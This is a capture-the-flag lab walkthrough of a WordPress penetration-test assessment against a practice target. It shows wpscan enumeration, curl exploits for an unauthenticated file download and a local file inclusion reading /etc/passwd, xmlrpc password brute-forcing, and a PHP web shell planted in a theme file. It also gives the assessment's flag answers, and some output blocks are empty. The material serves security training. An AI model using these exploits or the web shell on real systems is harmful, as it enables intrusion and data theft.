# Skills Assessment

We have reached the end of the module!

Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.

***

### Scenario

You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

Note: You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.

## Questions

***

![](gitbook/cybersecurity/images/Pasted%20image%2020250220140318.png)

#### Initial Enumeration

***

Let's begin by checking the website:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220140634.png)

We got `Home`, `About Us`, `Services`, `Dropdown`, `Contact` and `Blog`, all seems normal, this main site is not running on WordPress so we cannot enumerate it yet, if we go to blog, we can see this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220140811.png)

So, we need to add `blog.inlanefreight.local` to `/etc/hosts`, let's do it:

```
echo 'IP blog.inlanefreight.local' | sudo tee -a /etc/hosts
```

If we check this site now, we can see this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220140954.png)

We can check the technologies the site is using with `wappalyzer`:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220141020.png)

There we go, it is using WordPress `5.1.6`, let's use `wpscan` for the initial enumeration:

```
wpscan --url "http://blog.inlanefreight.local" --enumerate -t 50
```

We get this output:

```

 |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
```

We have 3 plugins:

```ad-info
1. email-subscribers 4.2.2
2. site-editor 1.1.1
3. the-events-calendar 5.1.2.1
```

We can begin by checking each one of them using the versions to check if there's any vulnerability regarding the version:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220142950.png)

Found the one we need, it is a `email-subscribers 4.2.2 Unauthenticated File Download` Exploit, here's the PoC:

```
# Exploit Title: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
# Google Dork: "Stable tag" inurl:wp-content/plugins/email-subscribers/readme.txt
# Date: 2020-07-20
# Exploit Author: KBA@SOGETI_ESEC
# Vendor Homepage: https://www.icegram.com/email-subscribers/
# Software Link: https://pluginarchive.com/wordpress/email-subscribers/v/4-2-2
# Version: <= 4.2.2
# Tested on: Email Subscribers & Newsletters 4.2.2
# CVE : CVE-2019-19985


curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'
```

So, we need to use curl in the following way:

```bash
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

We get this output:

```
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'

"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"

"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"

```

Got the flag:

```
HTB{unauTh_d0wn10ad!}
```

#### Checking for LFI vulnerable plugin

If we now search for:

```
site-editor 1.1.1 exploit
```

We get this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220143320.png)

Which means, we got our vulnerable plugin and its version:

```
1.1.1
```

#### Exploiting the LFI

***

Now, let's use the lfi:

```
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHP’s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

So, in order to read `/etc/passwd`, we need to use curl in this way:

```
curl http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

And we get this output:

```

```

Answer is:

```

```

#### Getting RCE

***

Now, our next step would be getting RCE, for this, we need some credentials, let's try brute forcing `erika`'s password:

```
wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

We get the following:

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / 010203                                                                             
Trying erika / kitkat Time: 00:00:20 <                         > (700 / 14345092)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: 010203

```

Got our credentials:

```
`erika`:`010203`
```

Now, let's log in:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220144626.png)

Now we're in the admin panel, let's change the theme to a web shell:

![](gitbook/cybersecurity/images/Pasted%20image%2020250220144824.png)

Let's change the contents of `404.php` to:

```php
<?php

system($_GET['cmd']);
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250220144836.png)

Nice, now we need to use curl to check if the webshell works:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

We get this:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It works, let's read `/home/erika` directory:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/erika"

d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

Found our flag, let's read it:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"

HTB{w0rdPr355_4SS3ssm3n7}
```

Our final flag is:

```
HTB{w0rdPr355_4SS3ssm3n7}
```
